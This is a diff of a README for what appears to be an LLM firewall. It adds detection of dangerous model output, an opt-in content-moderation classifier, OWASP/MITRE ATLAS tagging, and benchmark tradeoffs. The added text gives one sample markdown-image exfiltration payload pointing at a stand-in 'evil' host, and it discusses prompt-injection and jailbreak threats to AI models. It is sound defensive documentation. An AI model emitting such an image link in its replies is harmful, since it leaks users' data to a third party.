@@ -20,12 +20,20 @@ of the provider and every request is checked, scored, and logged — **no app ch
 - **Secret detection** — AWS/GitHub/Slack tokens, JWTs, private keys, plus a high-entropy gate.
 - **PII detection + masking** — emails, SSNs, IPs, Luhn-validated credit cards, redacted to typed
   tokens (e.g. `‹EMAIL›`).
+- **Improper output handling (OWASP LLM05)** — flags dangerous content in the *model's reply*:
+  destructive shell commands, HTML/JS injection, and markdown image data-exfiltration
+  (`![x](https://evil/?leak=…)`).
+- **Content moderation (Trust & Safety)** — optional harmful-content / harmful-request classifier
+  (DeBERTa) for hate / harassment / self-harm / violence and jailbreak-style harmful goals.
 - **Risk score (0–100)** — a weighted, diminishing-returns aggregate of all findings.
 - **Policy engine** — a flat, first-match YAML rule set: `allow` / `mask` / `block` / `flag`, scoped
   by direction (input vs. output).
+- **Standards mapping** — every finding is auto-tagged with its **OWASP LLM Top 10 (2025)** category
+  and **MITRE ATLAS** technique; the harness emits an OWASP coverage/risk report (`--report`).
 - **Response scanning + streaming** — inspects model output too, including SSE token streams
   (verbatim byte passthrough with a sliding-window scan).
-- **Structured audit log** — one JSON line per request (decision, score, reasons, latency).
+- **Structured audit log** — one JSON line per request (decision, score, reasons, OWASP/ATLAS tags,
+  latency).
 
 ## Supported providers
 
@@ -291,16 +299,43 @@ only (no ML); "+ ML" = full system with the DeBERTa stage.
 | xTRam1/safe-guard-prompt-injection | + ML | **84.3%** | **0.2%** | **0.913** | 137 ms |
 | JailbreakBench/JBB-Behaviors † | + ML | 0.0% | — | — | 120 ms |
 
-**†** JailbreakBench measures *harmful-content* goals (e.g. "write a defamatory article"),
-which is a **different threat than prompt injection**. This firewall detects injection /
-secrets / PII — it is not a content-moderation classifier — so a 0% here is expected and is
-shown only for scope transparency.
+**†** JailbreakBench measures *harmful-content* goals (e.g. "write a defamatory article") — a
+**different threat than prompt injection**. The injection stage isn't meant to catch it (hence 0%);
+the optional **content-moderation layer** does — see "Content moderation" below.
 
 **Operating point.** The ML stage acts on the classifier's own decision boundary
 (`P(injection) ≥ 0.5`, configurable) and blocks a positive detection directly. The DeBERTa
 model is well-calibrated (benign text scores ≈ 0), so this lifts recall by ~5–12 points over a
 naive high-cutoff setting **with no measurable change in false-alarm rate**.
 <!-- BENCHMARK:END -->
+
+### Content moderation (Trust & Safety) — optional, opt-in
+
+A separate DeBERTa harmful-content classifier (`--features ml`, model in `models/moderation/`) detects
+harmful *requests/content* — the threat JailbreakBench measures. It is **off by default** and evaluated
+separately, because it's a different capability with a different cost profile:
+
+| Corpus | Malicious accuracy | Notes |
+|---|---|---|
+| JailbreakBench/JBB-Behaviors (+ moderation) | **58.0%** | up from 0% with injection alone |
+
+**Honest tradeoff.** Enabling moderation on general traffic **adds over-defense**: on the injection
+corpora's benign prompts, turning it on raised false-alarms from ~0.2–1.6% to ~1.9–6.5%. That's why
+it's opt-in and, in production, best used as `flag` rather than `block`. It is also **not** a full safety
+system and makes no claim to detect illegal material (e.g. CSAM). See [`docs/model-card.md`](docs/model-card.md).
+
+### Compliance report (OWASP LLM Top 10 + MITRE ATLAS)
+
+Every finding is tagged with its OWASP LLM Top 10 (2025) category and MITRE ATLAS technique, and the
+harness can emit a coverage/risk report:
+
+```bash
+cargo run --release -p llm-firewall-bench -- \
+  --dataset datasets/safe_guard.jsonl --report compliance.md
+```
+
+This produces a coverage matrix (which OWASP categories the active detectors map to) plus observed
+findings by category and detector — see the tags in the audit log too.
 
 ### Understanding the numbers (plain English)
 
